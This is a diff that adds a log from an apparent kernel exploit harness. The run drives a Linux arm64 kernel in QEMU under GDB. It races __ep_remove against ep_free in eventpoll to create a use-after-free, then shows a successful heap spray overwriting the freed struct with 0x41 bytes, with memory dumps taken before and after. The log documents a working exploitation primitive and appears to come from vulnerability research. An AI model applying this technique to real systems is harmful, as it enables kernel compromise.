@@ -1,0 +1,59 @@
+[*] Compiling harness...
+[*] Compiling init...
+[*] Packaging rootfs...
+[*] Launching QEMU...
+[*] QEMU launched with PID 146312
+[*] Running EXP-018 GDB script...
+pwndbg: loaded 199 pwndbg commands. Type pwndbg [filter] for a list.
+pwndbg: created 12 GDB functions (can be used with print/break). Type help function to see them.
+0x0000000040000000 in ?? ()
+[*] Connected to QEMU
+Breakpoint 1 at 0xffff8000802bc9c0: file fs/eventpoll.c, line 346.
+[*] Breakpoints set. Continuing execution.
+[*] Thread A hit __ep_remove+0x19c (WRITE_ONCE finished).
+[*] target_file=-0xfffffdb1ff40, target_epoll=-0xfffffc9424c0
+[*] Original instruction at PC: -0x6effa000
+[*] Patched PC with infinite loop to suspend Thread A!
+Breakpoint 2 at 0xffff8000802bcbb4: file fs/eventpoll.c, line 793.
+[*] Thread B hit ep_free(-0xfffffc9424c0)!
+Breakpoint 3 at 0xffff8000802bcbbc: file fs/eventpoll.c, line 909.
+[*] Thread B finished ep_free. target_epoll is now FREED!
+[*] Memory dump of freed struct eventpoll (BEFORE spray):
+[*] 
+0xffff0000036bdb40:	0x0000000000000000	0x0000000000000000
+0xffff0000036bdb50:	0xffff0000036bdb50	0xffff0000036bdb50
+0xffff0000036bdb60:	0x0000000000000000	0xffff0000036bdb68
+0xffff0000036bdb70:	0xffff0000036bdb68	0x0000000000000000
+0xffff0000036bdb80:	0xffff0000036bdb80	0xffff0000036bdb80
+0xffff0000036bdb90:	0xffff0000036bdb90	0xffff0000036bdb90
+0xffff0000036bdba0:	0xffff0000036bda80	0x0000000000000000
+0xffff0000036bdbb0:	0x0000000000000000	0xffffffffffffffff
+0xffff0000036bdbc0:	0x0000000000000000	0xffff80008152be98
+0xffff0000036bdbd0:	0xffff0000024e00c0	0x0000000000000001
+0xffff0000036bdbe0:	0xffff0000036df450	0x0000000000000000
+0xffff0000036bdbf0:	0x0000000000000000	0x0000000000000000
+
+[*] Timer fired! Interrupting GDB to check spray...
+
+Thread 2 received signal SIGINT, Interrupt.
+[Switching to Thread 1.2]
+cpu_do_idle () at arch/arm64/kernel/idle.c:32
+32		arm_cpuidle_restore_irq_context(&context);
+[*] Interrupted! Dumping memory (AFTER spray):
+[*] 
+0xffff0000036bdb40:	0xffff0000036bda80	0xffff000003732bc0
+0xffff0000036bdb50:	0x0000000000000001	0x0000000000000090
+0xffff0000036bdb60:	0x0000000000000000	0xffff0000036de0f0
+0xffff0000036bdb70:	0x4141414141414141	0x4141414141414141
+0xffff0000036bdb80:	0x4141414141414141	0x4141414141414141
+0xffff0000036bdb90:	0x4141414141414141	0x4141414141414141
+0xffff0000036bdba0:	0x4141414141414141	0x4141414141414141
+0xffff0000036bdbb0:	0x4141414141414141	0x4141414141414141
+0xffff0000036bdbc0:	0x4141414141414141	0x4141414141414141
+0xffff0000036bdbd0:	0x4141414141414141	0x4141414141414141
+0xffff0000036bdbe0:	0x4141414141414141	0x4141414141414141
+0xffff0000036bdbf0:	0x4141414141414141	0x4141414141414141
+
+[*] Spray successful! Exiting GDB.
+[Inferior 1 (process 1) detached]
+[*] Stopping emulator...
